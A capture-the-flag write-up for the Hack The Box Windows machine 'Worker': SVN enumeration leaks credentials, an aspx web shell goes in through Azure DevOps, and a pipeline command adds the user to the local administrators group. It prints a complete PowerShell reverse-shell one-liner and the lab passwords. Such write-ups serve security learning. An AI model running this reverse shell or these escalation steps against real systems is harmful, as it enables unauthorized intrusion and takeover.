---
layout: default
title: Worker
permalink: /writeup/worker/
lang: en
---

<img src="./img/worker.png"  width="650"/>

Worker is a Windows machine. The ip of the box is 10.10.10.203.

# Recon

I starting with *nmap* scan `nmap -sC -Sv -oA nmap/worker 10.10.10.203`

<img src="./img/nmap.png"  width="650"/>

and discovers 2 services:
- *webserver*
- *SVN server*

On the web page there a home page

<img src="./img/home.png"  width="650"/>

and i start enumeration with `gobuster`
>gobuster dir -u 10.10.10.203 -w /usr/share/wordlists/dirb/common.txt 

I did not find anything

So i checked on the SVN (a useful [cheatsheet](https://www.perforce.com/blog/vcs/svn-commands-cheat-sheet))

<img src="./img/svnenum.png"  width="650"/>

There are a `txt` file

<img src="./img/moved.png"  width="650"/>

and a directory

So i added `dimension.worker.htb` and `devops.worker.htb` in `hosts` file 

<img src="./img/hosts.png"  width="650"/>

and i continued to enum the `SVN`

List old commits

<img src="./img/log.png"  width="650"/>

and checkout on r2 commit

<img src="./img/checkout.png"  width="650"/>

and found a deploy script with cred

<img src="./img/deploy.png"  width="650"/>

>user:**nathen** password:**wendel98**

At this point i navigate on `devops.worker.htb`

<img src="./img/devops.png"  width="650"/>

and i log in with the credentials found before and go on `Azure DevOps` home page

<img src="./img/homedevops.png"  width="650"/>


# User

From Azure webpage is possible upload any file so i decided to upload a `aspx` shell.

So i created a new branch for the repo `spectral` (cannot upload a file on master)

<img src="./img/branch.png"  width="650"/>

Added a *aspx* shell

<img src="./img/commit.png"  width="650"/>

and i issued a pull request

<img src="./img/pullrequest.png"  width="650"/>

I added `spectral.worker.htb` to hosts file and go on `spectral.worker.htb/t1.aspx`

<img src="./img/shell.png"  width="650"/>

So i opened a listener on local machine and executed the following command on remote shell

```powershell
powershell -np -c "$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```


<img src="./img/rev.png"  width="650"/>

In `W:\svnrepos\www\conf` there is a passwd files with several credentials

<img src="./img/passwd.png"  width="650"/>

i check for the user `robisl` and take the password

>user:**robisl** password:**wolves11**

and i log in with `evil-winrm`

<img src="./img/login.png"  width="650"/>

and i grab the user flag.

<img src="./img/userflag.png"  width="650"/>


# Root

Navigating back to `devops.worker.htb` with the new credentials, i get a different project on home page.

<img src="./img/home2.png"  width="650"/>

Azure DevOps contains pipelines for executing code,so i create a new pipeline and add the user robisl to the administrator group with

`net localgroup administrators robisl /add`

<img src="./img/pipelinecmd.png"  width="650"/>

So i login again with evil-winrm

<img src="./img/login2.png"  width="650"/>

this time the user `robisl` belongs to `Administrators` group so i can take root flag

<img src="./img/rootflag.png"  width="650"/>

<img src="./img/workerpwn.png"  width="650"/>




